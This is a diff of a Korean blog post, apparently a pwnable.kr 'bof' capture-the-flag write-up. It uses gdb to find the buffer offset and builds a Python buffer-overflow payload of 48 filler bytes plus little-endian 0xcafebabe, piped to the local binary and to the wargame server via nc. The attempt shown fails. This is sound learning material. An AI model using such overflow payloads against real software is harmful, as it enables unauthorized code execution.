@@ -226,9 +226,11 @@ gdb를 이용해 어셈블리 영역을 확인한다면...
 
 
 main은 이렇게
+
 ![disasMain](/img/02_disasMain.jpg)
 
 func함수는 이렇게
+
 ![disasFunc](/img/02_disasFunc.jpg)
 
 되어있는 것을 확인 가능하다. 그럼 key와 overflowme가 다루어지는 부분들을 보자... 
@@ -242,20 +244,27 @@ gets 함수가 call되는 지점이다.
 
     0x00401478 <+24>:    call   0x403ad0 <gets>
 
-보면 마치 gets함수로 받아와진 친구가 들어갈 자리라는 듯 주소가 하나 쨘 있지 않은가. 혹시 이게 overflowme 주소...? 물론 추측이다. 
 
-일단 킵. `0x403ad0`
+
+이 시점에서 함수들의 리턴값이 저장된다는... eax에 들어간 값을 보자. 
+
+![infoReg](/img/02_infoReg.jpg)
+
+
+gets함수의 리턴값, 즉 overflowme의 주소도 여기 저장된게 아닐까 라는 작은 소망을 품어보며 일단 킵. `0x61fee0`
 
 <br>
 
 
-이건 key가 `0xcafebabe`와 비교되고있는 coml문 부분이다. 
+이건 key가 `0xcafebabe`와 비교되고있는 cmp문 부분이다. 
 
-    0x0040147d <+29>:    cmpl   $0xcafebabe,0x8(%ebp)
 
-첫번째 operand는 어디서 많이 본 상수값, 두번째 operand는 0x8(%ebp)이다. 
+    0x0040147d <+29>:    cmp    DWORD PTR [ebp+0x8],0xcafebabe
 
-예상컨대 현시점 ebp 값에 0x8을 더한 것이 아닐까... 그니까 걔가 key가 아닐까 라는 작은 소망을 품어본다. 그럼 ebp값을 알아야겠다. 
+
+첫번째 operand는 ebp+0x8, 두번째 operand는 어디서 많이 본 상수값이다. 
+
+그니까 ebp+0x8가 key가 아닐까 라는 작은 소망을 품어본다. 그럼 ebp값을 알아야겠다. 
 
 
 레지스터들의 값을 확인해보자. 
@@ -276,33 +285,62 @@ gets 함수가 call되는 지점이다.
 
 그으러어며언... 
 
-아까 추정한 overflowme의 주소는 `0x403ad0`
+아까 추정한 overflowme의 주소는 `0x61fee0`
 
 그리고 방금 추정한 key의 주소는 `0x61ff10`
 
 더 높은 주소에 있는 key에서 overflowme를 빼보자... 
 
-    (gdb) p/d 0x61ff10 - 0x403ad0
-    $5 = 2212928
+    (gdb) p/d 0x61ff10 - 0x61fee0
+    $3 = 48
 
-사이의...ㄱㅓ리가... 2212928...?
-
-<br>
-
-이겠냐?
+사이의 거리가 48이다!! 
 
 <br>
 
-실패.
+
+그럼 48개의 dummy값과 key에 넣어줄....
+little endian방식의 0xcafebabe를 페이로드로 짜보자. 
+
+0xcafebabe는 10진수로 3405691582이다. key에 int로 담길테니까. 
+
+
+    `python -c "print 'x'*48 + '\xbe\xba\xfe\xca'"`
+
+
+
+그리고 이 친구를 oveflowme의 값으로 넣어줘 보자... 
+
+
+    (python -c "print 'x'*48 + '\xbe\xba\xfe\xca'";cat) | ./bof
+
+    (python -c "print 'x'*48 + '\xbe\xba\xfe\xca'";cat) | nc pwnable.kr 9000
+
+왱ㅏㄴ대............. 
+
+왜안대냑구.... 
+
+<br>
+
+
+window 이슈인가 싶어서 리눅스환경에서도 해봤다. 
 
 
 
 
 
 
+    ┌[ccsss☮4664a647eaaa]-(~/aaa)
+    └> ./bof
+    overflow me : xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx¾ºþÊ
+    Nah..
+    *** stack smashing detected ***: terminated
+    [1]    408 abort      ./bof
 
 
+에라이 안되네 
 
+임의로 컴파일링 한 게 문제인 듯...
 <br>
 <br>
 
@@ -326,7 +364,7 @@ gets 함수가 call되는 지점이다.
 <br>
 
 
-:(
+ㅜ-ㅠ
 
 
 
